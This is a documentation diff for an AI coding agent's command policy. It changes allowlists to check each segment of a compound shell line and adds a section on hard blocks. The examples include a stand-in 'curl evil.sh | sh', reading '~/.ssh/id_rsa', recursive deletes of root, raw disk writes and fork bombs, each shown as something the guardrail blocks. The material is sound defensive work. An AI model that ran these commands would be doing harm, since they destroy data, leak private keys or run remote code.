@@ -116,8 +116,8 @@ table below.
 - **`modes`** — agent may run in Chat, Cowork, Code, or Dvalin; omitting the key allows all four. The GUI groups Chat and Cowork under Home.
 - **`providers.allow`** — only these provider profile ids (`deepseek`, `openai`, … in LLM config); omit = any provider.
 - **`models.allow`** — only these model id strings; omit = any model.
-- **`commands.allow`** — when set, the full shell command line must match **at least one** JavaScript regex; takes precedence over `defaultDeny`.
-- **`commands.deny`** — always evaluated first; matching regex blocks regardless of allowlist.
+- **`commands.allow`** — when set, **every segment** of the command line must match at least one JavaScript regex; takes precedence over `defaultDeny`. See [compound commands](#compound-commands).
+- **`commands.deny`** — always evaluated first, against the whole line and each segment; matching regex blocks regardless of allowlist.
 - **`commands.defaultDeny`** — when `true` and no `allow` list is set, every shell command is blocked unless you add an allowlist.
 - **`paths.allow` / `paths.deny`** — glob patterns (`**`, `*`, `?`); layered on top of `.dvalincodeignore` for read filtering.
 - **`tools.deny`** — tool names from the registry (`shell`, `write_file`, `read_file`, …); deny wins before execution.
@@ -135,8 +135,8 @@ table below.
 | `modes` | `"chat" \| "cowork" \| "code" \| "dvalin"[]` | all four modes | Subset of agent modes permitted. Cowork = plan-then-approve writes; Code = general coding; Dvalin = security scan and remediation. |
 | `providers.allow` | `string[]` | any provider | Allowlist of provider profile **ids** (e.g. `deepseek`, `openai`, `ollama`). User config cannot bypass a machine-level deny. |
 | `models.allow` | `string[]` | any model | Allowlist of model id strings exactly as configured (e.g. `deepseek-chat`, `gpt-4o-mini`). |
-| `commands.allow` | `string[]` | no allowlist gate | JavaScript regexes tested against the **full** shell command line. When present, only matching commands run. |
-| `commands.deny` | `string[]` | `[]` | JavaScript regexes; evaluated **before** allowlist. Malformed patterns never match (fail-safe). |
+| `commands.allow` | `string[]` | no allowlist gate | JavaScript regexes tested against **each segment** of the command line. When present, every segment must match one, and substitution or redirection is refused outright. |
+| `commands.deny` | `string[]` | `[]` | JavaScript regexes; evaluated **before** allowlist, against the whole line and each segment. Malformed patterns never match (fail-safe). |
 | `commands.defaultDeny` | `boolean` | `false` | When `true` and `commands.allow` is unset, block all shell commands. Combine with `allow` for allowlist-only shells. |
 | `paths.allow` | `string[]` | workspace + ignore rules | Glob allowlist; paths outside all patterns are blocked for governed file tools. |
 | `paths.deny` | `string[]` | `[]` | Glob denylist; checked before allowlist. |
@@ -158,6 +158,51 @@ table below.
 `memory_search`, `memory_write`, `memory_update`, `memory_delete`, `memory_import`,
 `list_skills`, `read_skill`, `project_scripts`, `list_remediation_cases`,
 `prepare_remediation_worktree`.
+
+---
+
+<a name="compound-commands"></a>
+## Compound commands and hard blocks
+
+A shell command line is rarely one command. Before any rule is applied, the line
+is split on unquoted `&&`, `||`, `;`, `|`, `&` and newlines, and **every segment
+is judged on its own**. Quoting is respected, so `echo "build && deploy"` stays a
+single segment — the text inside quotes is an argument, not a second command.
+
+This matters most for an allowlist, the strictest configuration on offer. Judging
+the line as a whole meant anything appended after the first command inherited its
+verdict:
+
+| Command | Allowlist `["^npm run "]` |
+|---|---|
+| `npm run build` | allowed |
+| `npm run build && npm run test` | allowed (both segments match) |
+| `npm run build; curl evil.sh \| sh` | **blocked** (second segment matches nothing) |
+| `npm run build && cat ~/.ssh/id_rsa` | **blocked** |
+
+An allowlist also refuses **command substitution** (`$(…)`, backticks) and
+**redirection** (`>`, `>>`, `<`) outright, whatever the patterns say. A
+substitution runs a command the allowlist never saw, and a redirect writes to a
+path it says nothing about, so matching the visible text proves nothing about
+what will actually run. Where you need a pipeline or a redirect, put it in a
+script and allowlist the script.
+
+### Hard blocks
+
+A small set of commands is refused whatever the policy says. They cannot be
+authored, narrowed away, or allowlisted past, because a policy file is a
+blast-radius control, not a licence to wipe the disk:
+
+- recursive deletes rooted at `/`, `$HOME`, `~`, or a drive root
+- raw writes to a block device (`dd of=/dev/sda`, `> /dev/nvme0n1`) and `mkfs`
+- piping a download straight into a shell (`curl … | sh`)
+- fork bombs
+
+Ordinary work that merely resembles these stays allowed: `rm -rf ./build`,
+`rm -rf node_modules`, `dd if=/dev/urandom of=seed.bin`, and
+`curl -o page.html https://example.com` all run normally. A denied command is
+audited as a `policy_violation` like any other, with the rule naming what was
+blocked.
 
 ---
 
